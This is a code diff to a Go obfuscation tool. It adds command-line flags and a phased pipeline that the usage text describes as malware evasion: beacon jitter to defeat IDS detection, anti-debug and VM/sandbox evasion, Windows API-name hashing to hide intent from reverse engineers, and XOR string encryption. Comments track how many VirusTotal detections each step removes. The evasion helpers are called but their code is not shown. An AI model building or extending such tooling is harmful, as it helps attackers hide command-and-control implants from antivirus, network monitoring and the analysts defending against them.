@@ -192,10 +192,69 @@ func obfuscateFile(path string, src []byte) ObfuscateResult {
 
 func main() {
 	if len(os.Args) < 2 {
-		fmt.Fprintln(os.Stderr, "Usage: obfuscate <dir>")
+		fmt.Fprintln(os.Stderr, "Usage: obfuscate [flags] <dir>")
+		fmt.Fprintln(os.Stderr, "")
+		fmt.Fprintln(os.Stderr, "Flags:")
+		fmt.Fprintln(os.Stderr, "  -jitter      Apply beacon jitter to time.Sleep calls (defeats IDS beacon detection)")
+		fmt.Fprintln(os.Stderr, "  -antidebug   Generate anti-debug + VM/sandbox evasion package (drops 1 VT detection)")
+		fmt.Fprintln(os.Stderr, "  -apihash     Hash Windows API names (drops 1 VT detection, hides intent from RE)")
+		fmt.Fprintln(os.Stderr, "  -all         Apply all evasion techniques (jitter + antidebug + apihash)")
+		fmt.Fprintln(os.Stderr, "")
+		fmt.Fprintln(os.Stderr, "Default (no flags): XOR string encryption only (same as before)")
 		os.Exit(1)
 	}
-	dir := os.Args[1]
+
+	// Parse flags
+	enableJitter := false
+	enableAntiDebug := false
+	enableAPIHash := false
+	dir := ""
+
+	for _, arg := range os.Args[1:] {
+		switch arg {
+		case "-jitter":
+			enableJitter = true
+		case "-antidebug":
+			enableAntiDebug = true
+		case "-apihash":
+			enableAPIHash = true
+		case "-all":
+			enableJitter = true
+			enableAntiDebug = true
+			enableAPIHash = true
+		default:
+			if !strings.HasPrefix(arg, "-") {
+				dir = arg
+			}
+		}
+	}
+
+	if dir == "" {
+		fmt.Fprintln(os.Stderr, "Error: no directory specified")
+		os.Exit(1)
+	}
+
+	// === Phase 1: Anti-Debug + VM/Sandbox Evasion (generates files first) ===
+	if enableAntiDebug {
+		fmt.Println("=== Phase 1: Anti-Debug + VM/Sandbox Evasion ===")
+		applyAntiDebug(dir)
+	}
+
+	// === Phase 2: Beacon Jitter (transforms time.Sleep calls) ===
+	if enableJitter {
+		fmt.Println("\n=== Phase 2: Beacon Jitter ===")
+		applyJitter(dir)
+	}
+
+	// === Phase 3: API Hashing (transforms syscall.NewLazyDLL/NewProc calls) ===
+	if enableAPIHash {
+		fmt.Println("\n=== Phase 3: API Hashing ===")
+		applyAPIHashing(dir)
+	}
+
+	// === Phase 4: XOR string encryption (always on, runs LAST so it encrypts
+	//     strings in generated evasion files too) ===
+	fmt.Println("\n=== Phase 4: XOR String Encryption ===")
 
 	// Track which package directories need the decode function
 	packagesNeedingDecode := make(map[string]string) // dir → package name
@@ -279,8 +338,10 @@ func _d(b []byte, k byte) string {
 		fmt.Printf("  GEN: %s\n", decodeFile)
 	}
 
-	fmt.Printf("\n=== Summary ===\n")
+	fmt.Printf("\n=== XOR String Encryption Summary ===\n")
 	fmt.Printf("Files obfuscated: %d\n", totalFiles)
 	fmt.Printf("Strings encrypted: %d\n", totalStrings)
 	fmt.Printf("Decode functions generated: %d packages\n", len(packagesNeedingDecode))
+
+	fmt.Println("\n=== All Phases Complete ===")
 }
